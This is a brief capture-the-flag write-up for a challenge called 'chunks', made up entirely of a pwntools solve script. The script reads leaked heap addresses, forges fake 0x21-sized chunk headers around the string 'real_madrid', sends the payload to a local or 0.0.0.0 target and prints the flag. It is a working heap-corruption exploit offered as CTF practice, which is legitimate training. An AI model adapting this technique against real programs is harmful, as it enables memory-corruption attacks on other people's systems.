# chunks
## writeup

solve script 
```py
from pwn import *

if args.REMOTE:
    io = remote('0.0.0.0', 1234)
else:   
    io = process('./chall')


io.recvuntil('here is your gift:\n')
leaks = io.recvlines(4)
leaks = [int(i.decode(), 16) for i in leaks]
log.info(leaks)
chunk_size = 24

payload = b'real_madrid' + b'\x00'*(chunk_size-len('real_madrid'))

for i in range(1,4):
    payload += p64(0x21)
    payload += p64(leaks[i])
    payload += p64(i+1)+p64(0)
    payload += p64(0x21)
    payload += b'real_madrid'+b'\x00'*(chunk_size-len('real_madrid'))

if args.GDB:
    gdb.attach(io)

io.sendline(payload)
   
io.recvlines(5)
flag = io.recvline()

print(flag.decode())
```
